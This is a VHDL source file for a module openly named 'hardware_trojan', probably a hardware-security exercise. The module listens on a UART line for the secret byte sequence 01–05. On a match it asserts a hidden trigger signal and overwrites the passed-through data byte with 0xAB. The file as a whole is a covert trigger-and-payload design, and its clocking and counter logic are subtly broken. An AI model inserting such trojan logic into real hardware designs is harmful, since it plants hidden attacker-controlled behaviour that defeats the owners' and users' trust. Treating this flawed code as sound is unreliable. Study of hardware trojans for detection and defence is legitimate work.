library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

entity hardware_trojan is
generic (
    clock_cycles_per_byte : integer := 868 -- 100Mhz/115200 = 868.055556
 );
Port (
    
    trigger_input : in std_logic;
    clk : in std_logic;
   trigger_signal : out std_logic;
    trojan_output : out std_logic_vector(7 downto 0)
    
 );
end hardware_trojan;

architecture Behavioral of hardware_trojan is

type states is (idle,first_byte,second_byte,third_byte,fourth_byte);
signal trojan_state : states;
--signal clk_count : integer range 0 to clock_cycles_per_byte := 0;
signal uart_reference_counter : integer;
signal hw_reference_counter : integer := 0;
signal dv :  std_logic;
signal od :  std_logic_vector(7 downto 0);
signal output_before_check  : std_logic_vector(7 downto 0);


begin

uart_inst : entity work.rx_uart
port map(
     rx_serial => trigger_input,
     clock =>  clk,
     reference_counter => uart_reference_counter,
    dv =>  dv,
    od =>  output_before_check
); 
process(clk)
begin
hw_reference_counter <= uart_reference_counter;
if (hw_reference_counter = 8245) then
    --trojan_output <= output_before_check;
case trojan_state is 
    when idle =>
            
            if (output_before_check = X"01") then
                trojan_state <= first_byte;
                trojan_output <= output_before_check;

                hw_reference_counter <= 0;
            else
                trojan_state <= idle;
                trojan_output <= output_before_check;
                hw_reference_counter <= 0;
            end if;
    when first_byte =>
             if hw_reference_counter = 8245 then
                if (output_before_check = X"02") then
                    trojan_state <= second_byte;
                    hw_reference_counter <= 0;
                    trojan_output <= output_before_check;
                else
                    trojan_state <= idle;
                    trojan_output <= output_before_check;
            end if;
            else 
                hw_reference_counter <= hw_reference_counter +1;
            end if;
     when second_byte =>
            if hw_reference_counter = 8245 then
                if (output_before_check = X"03") then
                    trojan_state <= third_byte;
                    hw_reference_counter <= 0;
                    trojan_output <= output_before_check;
                else
                    trojan_state <= idle;
                    trojan_output <= output_before_check;
            end if;
            else 
                hw_reference_counter <= hw_reference_counter +1;
            end if;
      when third_byte =>
             if hw_reference_counter = 8245 then
                if (output_before_check = X"04") then
                    trojan_state <= fourth_byte;
                    hw_reference_counter <= 0;
                    trojan_output <= output_before_check;
                else
                    trojan_state <= idle;
                    trojan_output <= output_before_check;
            end if;
            else 
                hw_reference_counter <= hw_reference_counter +1;
            end if;
      when fourth_byte =>
--             if (output_before_check = X"05") then
--                trigger_signal <= '1';
--                trojan_output <= X"AB";
                
--            else
--                trojan_state <= idle;
--            end if;
           if hw_reference_counter = 8245 then
                if (output_before_check = X"05") then
                    trojan_output <= output_before_check;
                    hw_reference_counter <= 0;
                    trigger_signal <= '1';
                    trojan_output <= X"AB";
                else
                    trojan_state <= idle;
                    trojan_output <= output_before_check;
            end if;
            else 
                hw_reference_counter <= hw_reference_counter +1;
            end if;
            
            
      when others => 
            trojan_output <= output_before_check;
            trojan_state <= idle;      
      end case;   
end if;
end process;




--process(trojan_state,clk)
--begin
--if (reference_counter > 8200) then
--if rising_edge(clk) then
--case trojan_state is 
--    when idle =>
            
--            if (output_before_check = X"01") then
--                trojan_state <= first_byte;
--            else
--                trojan_state <= idle;
--                trojan_output <= output_before_check;
                
--            end if;
--    when first_byte =>
--             if (output_before_check = X"02") then
--                trojan_state <= second_byte;
                
--            else
--                trojan_state <= idle;
--                trojan_output <= output_before_check;

--            end if;
--     when second_byte =>
--             if (output_before_check = X"03") then
--                trojan_state <= third_byte;
--            else
--                trojan_state <= idle;
--                trojan_output <= output_before_check;
--            end if;
--      when third_byte =>
--             if (output_before_check = X"04") then
--                trojan_state <= fourth_byte;
--            else
--                trojan_state <= idle;
--                trojan_output <= output_before_check;

--            end if;
--      when fourth_byte =>
--             if (output_before_check = X"05") then
--                trigger_signal <= '1';
--                trojan_output <= X"AB";
                
--            else
--                trojan_state <= idle;
--            end if;
--      when others => 
--            trojan_output <= output_before_check;
--            trojan_state <= idle;      
--      end case;   
--end if;
--end if;
--end process;

end Behavioral;
